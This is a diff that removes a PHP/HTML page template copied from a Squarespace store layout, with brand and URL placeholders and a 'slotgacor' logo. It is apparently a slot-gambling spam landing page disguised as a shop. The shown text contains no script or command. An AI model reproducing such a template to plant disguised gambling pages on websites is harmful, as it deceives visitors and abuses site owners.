-  <path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
-  <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
-  <path d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
-  <path d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
-</svg>
-
-                      <div class="icon-cart-quantity">
-                        
-                <span class="cart-quantity-container">
-                  
-                    <span class="sqs-cart-quantity">0</span>
-                  
-                </span>
-              
-                      </div>
-                    </span>
-                  </a>
-                </div>
-              
-                  
-                  
-                
-              
-                
-              </div>
-
-              
-              <div class="showOnDesktop">
-                
-                  
-                
-                
-                  
-                    
-                <div class="header-actions-action header-actions-action--cart">
-                  <a href="<?php echo $urlPath ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" >
-                    <span class="Cart-inner">
-                      
-
-
-
-  <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
-  <path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
-  <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
-  <path d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
-  <path d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
-</svg>
-
-                      <div class="icon-cart-quantity">
-                        
-                <span class="cart-quantity-container">
-                  
-                    <span class="sqs-cart-quantity">0</span>
-                  
-                </span>
-              
-                      </div>
-                    </span>
-                  </a>
-                </div>
-              
-                  
-                  
-                
-              
-                
-              </div>
-
-              
-            </div>
-          
-          
-          
-          
-          
-          
-
-        </div>
-        <div class="header-display-mobile" data-content-field="site-title">
-          
-            
-            <!-- Social -->
-            
-          
-            
-            <!-- Title and nav wrapper -->
-            <div class="header-title-nav-wrapper">
-              
-
-              
-
-              
-                
-                <!-- Title -->
-                
-                  <div
-                    class="
-                      header-title
-                      
-                    "
-                    data-animation-role="header-element"
-                  >
-                    
-                      <div class="header-title-logo">
-                        <a href="<?php echo $urlPath ?>" data-animation-role="header-element">
-                        
-<img elementtiming="nbf-header-logo-desktop" src="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/slotgacor.png?format=1500w" alt="<?php echo $BRANDS ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
-
-                        </a>
-                      </div>
-
-                    
-                    
-                  </div>
-                
-              
-                
-                <!-- Nav -->
-                <div class="header-nav">
-                  <div class="header-nav-wrapper">
-                    <nav class="header-nav-list">
-                      
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        Shop
-      </a>
-    </div>
-  
-  
-  
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        Journal
-      </a>
-    </div>
-  
-  
-  
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        About
-      </a>
-    </div>
-  
-  
-  
-
-
-  
-    <div class="header-nav-item header-nav-item--collection">
-      <a
-        href="#"
-        data-animation-role="header-element"
-        
-      >
-        Contact
-      </a>
-    </div>
-  
-  
-  
-
-
-
-                    </nav>
-                  </div>
-                </div>
-              
-              
-            </div>
-          
-            
-            <!-- Actions -->
-            <div class="header-actions header-actions--right">
-              
-                
-              
-              
-
-              
-
-            
-            
-
-              
-
-              
-
-              
-
-              
-
-              
-            
-
-              
-              <div class="showOnMobile">
-                
-                  
-                
-                
-                  
-                    
-                <div class="header-actions-action header-actions-action--cart">
-                  <a href="<?php echo $urlPath ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" >
-                    <span class="Cart-inner">
-                      
-
-
-
-  <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
-  <path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
-  <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
-  <path d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
-  <path d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
-</svg>
-
-                      <div class="icon-cart-quantity">
-                        
-                <span class="cart-quantity-container">
-                  
-                    <span class="sqs-cart-quantity">0</span>
-                  
-                </span>
-              
-                      </div>
-                    </span>
-                  </a>
-                </div>
-              
-                  
-                  
-                
-              
-                
-              </div>
-
-              
-              <div class="showOnDesktop">
-                
-                  
-                
-                
-                  
-                    
-                <div class="header-actions-action header-actions-action--cart">
-                  <a href="<?php echo $urlPath ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" >
-                    <span class="Cart-inner">
-                      
-
-
-
-  <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
-  <path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
-  <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
-  <path d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
-  <path d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
-</svg>
-
-                      <div class="icon-cart-quantity">
-                        
-                <span class="cart-quantity-container">
-                  
-                    <span class="sqs-cart-quantity">0</span>
-                  
-                </span>
-              
-                      </div>
-                    </span>
-                  </a>
-                </div>
-              
-                  
-                  
-                
-              
-                
-              </div>
-
-              
-            </div>
-          
-            
-
-
-<style>
-  .top-bun, 
-  .patty, 
-  .bottom-bun {
-    height: 1px;
-  }
-</style>
-
-<!-- Burger -->
-<div class="header-burger
-
-  menu-overlay-does-not-have-visible-non-navigation-items
-
-
-  
-  no-actions
-  
-" data-animation-role="header-element">
-  <button class="header-burger-btn burger" data-test="header-burger">
-    <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
-    <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
-    <div class="burger-box">
-      <div class="burger-inner header-menu-icon-doubleLineHamburger">
-        <div class="top-bun"></div>
-        <div class="patty"></div>
-        <div class="bottom-bun"></div>
-      </div>
-    </div>
-  </button>
-</div>
-
-          
-          
-          
-          
-          
-        </div>
-      </div>
-    </div>
-    <!-- (Mobile) Menu Navigation -->
-    <div class="header-menu header-menu--folder-list
-      light
-      
-      
-      
-      
-      "
-      data-section-theme="light"
-      data-current-styles="{
-            &quot;layout&quot;: &quot;navCenter&quot;,
-            &quot;action&quot;: {
-              &quot;buttonText&quot;: &quot;Get Started&quot;,
-              &quot;newWindow&quot;: false
-            },
-            &quot;showSocial&quot;: false,
-            &quot;socialOptions&quot;: {
-              &quot;socialBorderShape&quot;: &quot;none&quot;,
-              &quot;socialBorderStyle&quot;: &quot;outline&quot;,
-              &quot;socialBorderThickness&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 1.0
-              }
-            },
-            &quot;sectionTheme&quot;: &quot;&quot;,
-            &quot;menuOverlayTheme&quot;: &quot;light&quot;,
-            &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
-            &quot;cartStyle&quot;: &quot;cart&quot;,
-            &quot;cartText&quot;: &quot;Cart&quot;,
-            &quot;showEmptyCartState&quot;: true,
-            &quot;cartOptions&quot;: {
-              &quot;iconType&quot;: &quot;solid-7&quot;,
-              &quot;cartBorderShape&quot;: &quot;none&quot;,
-              &quot;cartBorderStyle&quot;: &quot;outline&quot;,
-              &quot;cartBorderThickness&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 1.0
-              }
-            },
-            &quot;showButton&quot;: false,
-            &quot;showCart&quot;: true,
-            &quot;showAccountLogin&quot;: false,
-            &quot;headerStyle&quot;: &quot;dynamic&quot;,
-            &quot;languagePicker&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;iconEnabled&quot;: false,
-              &quot;iconType&quot;: &quot;globe&quot;,
-              &quot;flagShape&quot;: &quot;shiny&quot;,
-              &quot;languageFlags&quot;: [ ]
-            },
-            &quot;mobileOptions&quot;: {
-              &quot;layout&quot;: &quot;logoLeftNavRight&quot;,
-              &quot;menuIcon&quot;: &quot;halfLineHamburger&quot;,
-              &quot;menuIconOptions&quot;: {
-                &quot;style&quot;: &quot;doubleLineHamburger&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 1.0
-                }
-              }
-            },
-            &quot;dynamicOptions&quot;: {
-              &quot;border&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;position&quot;: &quot;allSides&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 4.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              }
-            },
-            &quot;solidOptions&quot;: {
-              &quot;headerOpacity&quot;: {
-                &quot;unit&quot;: &quot;%&quot;,
-                &quot;value&quot;: 100.0
-              },
-              &quot;border&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;position&quot;: &quot;allSides&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 4.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;dropShadow&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blur&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 30.0
-                },
-                &quot;spread&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;distance&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;blurBackground&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blurRadius&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 12.0
-                }
-              },
-              &quot;backgroundColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;white&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              },
-              &quot;navigationColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;black&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              }
-            },
-            &quot;gradientOptions&quot;: {
-              &quot;gradientType&quot;: &quot;faded&quot;,
-              &quot;headerOpacity&quot;: {
-                &quot;unit&quot;: &quot;%&quot;,
-                &quot;value&quot;: 90.0
-              },
-              &quot;border&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;position&quot;: &quot;allSides&quot;,
-                &quot;thickness&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 4.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;dropShadow&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blur&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 30.0
-                },
-                &quot;spread&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;distance&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 0.0
-                },
-                &quot;color&quot;: {
-                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                  &quot;sitePaletteColor&quot;: {
-                    &quot;colorName&quot;: &quot;black&quot;,
-                    &quot;alphaModifier&quot;: 1.0
-                  }
-                }
-              },
-              &quot;blurBackground&quot;: {
-                &quot;enabled&quot;: false,
-                &quot;blurRadius&quot;: {
-                  &quot;unit&quot;: &quot;px&quot;,
-                  &quot;value&quot;: 12.0
-                }
-              },
-              &quot;backgroundColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;white&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              },
-              &quot;navigationColor&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;black&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              }
-            },
-            &quot;dropShadowOptions&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;blur&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 12.0
-              },
-              &quot;spread&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 0.0
-              },
-              &quot;distance&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 12.0
-              }
-            },
-            &quot;borderOptions&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;position&quot;: &quot;allSides&quot;,
-              &quot;thickness&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 4.0
-              },
-              &quot;color&quot;: {
-                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                &quot;sitePaletteColor&quot;: {
-                  &quot;colorName&quot;: &quot;black&quot;,
-                  &quot;alphaModifier&quot;: 1.0
-                }
-              }
-            },
-            &quot;showPromotedElement&quot;: false,
-            &quot;buttonVariant&quot;: &quot;primary&quot;,
-            &quot;blurBackground&quot;: {
-              &quot;enabled&quot;: false,
-              &quot;blurRadius&quot;: {
-                &quot;unit&quot;: &quot;px&quot;,
-                &quot;value&quot;: 12.0
-              }
-            },
-            &quot;headerOpacity&quot;: {
-              &quot;unit&quot;: &quot;%&quot;,
-              &quot;value&quot;: 100.0
-            }
-          }"
-      data-section-id="overlay-nav"
-      data-show-account-login="false"
-      data-test="header-menu">
-      <div class="header-menu-bg theme-bg--primary"></div>
-      <div class="header-menu-nav">
-        <nav class="header-menu-nav-list">
-          <div data-folder="root" class="header-menu-nav-folder">
-            <div class="header-menu-nav-folder-content">
-              <!-- Menu Navigation -->
-<div class="header-menu-nav-wrapper">
-  
-    
-      
-        
-          
-            <div class="container header-menu-nav-item header-menu-nav-item--collection">
-              <a
-                href="#"
-                
-              >
-                <div class="header-menu-nav-item-content">
-                  Shop
-                </div>
-              </a>
-            </div>
-          
-        
-      
-    
-      
-        
-          
-            <div class="container header-menu-nav-item header-menu-nav-item--collection">
-              <a
-                href="#"
-                
-              >
-                <div class="header-menu-nav-item-content">
-                  Journal
-                </div>
-              </a>
-            </div>
-          
-        
-      
-    
-      
-        
-          
-            <div class="container header-menu-nav-item header-menu-nav-item--collection">
-              <a
-                href="#"
-                
-              >
-                <div class="header-menu-nav-item-content">
-                  About
-                </div>
-              </a>
-            </div>
-          
-        
-      
-    
-      
-        
-          
-            <div class="container header-menu-nav-item header-menu-nav-item--collection">
-              <a
-                href="#"
-                
-              >
-                <div class="header-menu-nav-item-content">
-                  Contact
-                </div>
-              </a>
-            </div>
-          
-        
-      
-    
-  
-</div>
-
-              
-                
-              
-            </div>
-            
-            
-            
-          </div>
-        </nav>
-      </div>
-    </div>
-  </header>
-
-
-
-
-      <main id="page" class="container" role="main">
-        
-          
-<article class="sections" id="sections" data-page-sections="66aa1e7e3f10ff32dbb82b75">
-  
-  
-    
-    
-
-
-  
-
-
-<section
-  data-test="page-section"
-  
-  data-section-theme="light"
-  class='page-section 
-    
-      full-bleed-section
-      layout-engine-section
-    
-    background-width--full-bleed
-    
-      
-        section-height--custom
-      
-    
-    
-      content-width--wide
-    
-    horizontal-alignment--center
-    vertical-alignment--middle
-    
-      
-    
-    
-    light'
-  
-  data-section-id="66aa1e7e3f10ff32dbb82b79"
-  
-  data-controller="SectionWrapperController"
-  data-current-styles="{
-            &quot;imageOverlayOpacity&quot;: 0.24,
-            &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
-            &quot;sectionHeight&quot;: &quot;section-height--custom&quot;,
-            &quot;customSectionHeight&quot;: 10,
-            &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
-            &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
-            &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
-            &quot;customContentWidth&quot;: 50,
-            &quot;sectionTheme&quot;: &quot;light&quot;,
-            &quot;sectionAnimation&quot;: &quot;none&quot;,
-            &quot;backgroundMode&quot;: &quot;image&quot;
-          }"
-  data-current-context="{
-            &quot;video&quot;: {
-              &quot;playbackSpeed&quot;: 0.5,
-              &quot;filter&quot;: 1,
-              &quot;filterStrength&quot;: 0,
-              &quot;zoom&quot;: 0,
-              &quot;videoSourceProvider&quot;: &quot;none&quot;
-            },
-            &quot;backgroundImageId&quot;: null,
-            &quot;backgroundMediaEffect&quot;: null,
-            &quot;divider&quot;: null,
-            &quot;typeName&quot;: &quot;page&quot;
-          }"
-  data-animation="none"
-  data-fluid-engine-section
-   
-  
-     style="min-height: 10vh;" 
-  
-  
->
-  <div
-    class="section-border"
-    
-  >
-    <div class="section-background">
-    
-      
-    
-    </div>
-  </div>
-  <div
-    class='content-wrapper'
-    style='
-      
-        
-          
-          
-          padding-top: calc(10vmax / 10); padding-bottom: calc(10vmax / 10);
-        
-      
-    '
-  >
-    <div
-      class="content"
-      
-    >
-      
-      
-      
-      
-      
-      
-      <div data-fluid-engine="true"><style>
-
-.fe-66aa1e7e3f10ff32dbb82b78 {
-  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 11.0px);
-  --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (11.0px * (8 - 1)) ) / 8 );
-
-  display: grid;
-  position: relative;
-  grid-area: 1/1/-1/-1;
-  grid-template-rows: repeat(31,minmax(24px, auto));
-  grid-template-columns:
-    minmax(var(--grid-gutter), 1fr)
-    repeat(8, minmax(0, var(--cell-max-width)))
-    minmax(var(--grid-gutter), 1fr);
-  row-gap: 11.0px;
-  column-gap: 11.0px;
-}
-
-@media (min-width: 768px) {
-  .background-width--inset .fe-66aa1e7e3f10ff32dbb82b78 {
-    --inset-padding: calc(var(--sqs-site-gutter) * 2);
-  }
-
-  .fe-66aa1e7e3f10ff32dbb82b78 {
-    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 11.0px);
-    --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (11.0px * (24 - 1)) ) / 24 );
-    --inset-padding: 0vw;
-
-    --row-height-scaling-factor: 0.0215;
-    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding) ));
-
-    grid-template-rows: repeat(24,minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));
-    grid-template-columns:
-      minmax(var(--grid-gutter), 1fr)
-      repeat(24, minmax(0, var(--cell-max-width)))
-      minmax(var(--grid-gutter), 1fr);
-  }
-}
-
-
-  .fe-block-cf148d921eebf195e97d {
-    grid-area: 1/2/9/10;
-    z-index: 0;
-
-    @media (max-width: 767px) {
-      
-    }
-  }
-
-  .fe-block-cf148d921eebf195e97d .sqs-block {
-    justify-content: center;
-  }
-
-  .fe-block-cf148d921eebf195e97d .sqs-block-alignment-wrapper {
-    align-items: center;
-  }
-
-  @media (min-width: 768px) {
-    .fe-block-cf148d921eebf195e97d {
-      grid-area: 1/13/12/26;
-      z-index: 0;
-
-      
-    }
-
-    .fe-block-cf148d921eebf195e97d .sqs-block {
-      justify-content: center;
-    }
-
-    .fe-block-cf148d921eebf195e97d .sqs-block-alignment-wrapper {
-      align-items: center;
-    }
-  }
-
-  .fe-block-1d5daefebc1e26fff13d {
-    grid-area: 11/2/21/10;
-    z-index: 1;
-
-    @media (max-width: 767px) {
-      
-    }
-  }
-
-  .fe-block-1d5daefebc1e26fff13d .sqs-block {
-    justify-content: flex-start;
-  }
-
-  .fe-block-1d5daefebc1e26fff13d .sqs-block-alignment-wrapper {
-    align-items: flex-start;
-  }
-
-  @media (min-width: 768px) {
-    .fe-block-1d5daefebc1e26fff13d {
-      grid-area: 4/2/12/13;
-      z-index: 1;
-
-      
-    }
-
-    .fe-block-1d5daefebc1e26fff13d .sqs-block {
-      justify-content: flex-start;
-    }
-
-    .fe-block-1d5daefebc1e26fff13d .sqs-block-alignment-wrapper {
-      align-items: flex-start;
-    }
-  }
-
-  .fe-block-yui_3_17_2_1_1722424940572_11797 {
-    grid-area: 9/2/15/10;
-    z-index: 3;
-
-    @media (max-width: 767px) {
-      
-        
-      
-    }
-  }
-
-  .fe-block-yui_3_17_2_1_1722424940572_11797 .sqs-block {
-    justify-content: flex-start;
-  }
-
-  .fe-block-yui_3_17_2_1_1722424940572_11797 .sqs-block-alignment-wrapper {
-    align-items: flex-start;
-  }
-
-  @media (min-width: 768px) {
-    .fe-block-yui_3_17_2_1_1722424940572_11797 {
-      grid-area: 1/2/5/13;
-      z-index: 3;
-
-      
-        
-      
-    }
-
-    .fe-block-yui_3_17_2_1_1722424940572_11797 .sqs-block {
-      justify-content: flex-start;
-    }
-
-    .fe-block-yui_3_17_2_1_1722424940572_11797 .sqs-block-alignment-wrapper {
-      align-items: flex-start;
-    }
-  }
-
-  .fe-block-yui_3_17_2_1_1722424940572_8656 {
-    grid-area: 20/2/25/10;
-    z-index: 2;
-
-    @media (max-width: 767px) {
-      
-        
-      
-    }
-  }
-
-  .fe-block-yui_3_17_2_1_1722424940572_8656 .sqs-block {
-    justify-content: flex-start;
-  }
-
-  .fe-block-yui_3_17_2_1_1722424940572_8656 .sqs-block-alignment-wrapper {
-    align-items: flex-start;
-  }
-
-  @media (min-width: 768px) {
-    .fe-block-yui_3_17_2_1_1722424940572_8656 {
-      grid-area: 13/2/23/13;
-      z-index: 2;
-
-      
-        
-      
-    }
-
-    .fe-block-yui_3_17_2_1_1722424940572_8656 .sqs-block {
-      justify-content: flex-start;
-    }
-
-    .fe-block-yui_3_17_2_1_1722424940572_8656 .sqs-block-alignment-wrapper {
-      align-items: flex-start;
-    }
-  }
-
-</style><div class="fluid-engine fe-66aa1e7e3f10ff32dbb82b78"><div class="fe-block fe-block-cf148d921eebf195e97d"><div class="sqs-block image-block sqs-block-image sqs-stretched" data-block-type="5" id="block-cf148d921eebf195e97d"><div class="sqs-block-content">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-    
-  
-    <div
-      class="
-        image-block-outer-wrapper
-        layout-caption-below
-        design-layout-fluid
-        image-position-right
-        combination-animation-reveal
-        individual-animation-site-default
-      "
-      data-test="image-block-fluid-outer-wrapper"
-    >
-      <div
-        class="fluid-image-animation-wrapper sqs-image sqs-block-alignment-wrapper"
-        data-animation-role="image"
-        
-  data-animation-override
-
-      >
-        <div
-          class="fluid-image-container sqs-image-content"
-          
-          style="overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);position: relative;width: 100%;height: 100%;"
-        >
-          
-
-          
-          
-
-          
-            
-              <div class="content-fit">
-                
-            
-            
-            
-            
-            
-            
-            <img data-stretch="false" data-src="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg" data-image="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg" data-image-dimensions="1280x720" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg" width="1280" height="720" alt="" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 54.166666666666664vw" style="display:block;object-fit: contain; object-position: 50% 50%" srcset="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=100w 100w, https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=300w 300w, https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=500w 500w, https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=750w 750w, https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=1000w 1000w, https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=1500w 1500w, https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs">
-
-            
-              
-            
-            <div class="fluidImageOverlay"></div>
-          
-              </div>
-            
-          
-
-        </div>
-      </div>
-    </div>
-    <style>
-      .sqs-block-image .sqs-block-content {
-        height: 100%;
-        width: 100%;
-      }
-
-      
-        .fe-block-cf148d921eebf195e97d .fluidImageOverlay {
-          position: absolute;
-          top: 0;
-          left: 0;
-          width: 100%;
-          height: 100%;
-          mix-blend-mode: normal;
-          
-            
-            
-          
-          
-            opacity: 0;
-          
-        }
-      
-    </style>
-  
-
-
-  
-
-
-</div></div></div><div class="fe-block fe-block-1d5daefebc1e26fff13d"><div class="sqs-block html-block sqs-block-html" data-blend-mode="NORMAL" data-block-type="2" data-border-radii="&#123;&quot;topLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;topRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;&#125;" id="block-1d5daefebc1e26fff13d"><div class="sqs-block-content">
-
-<div class="sqs-html-content">
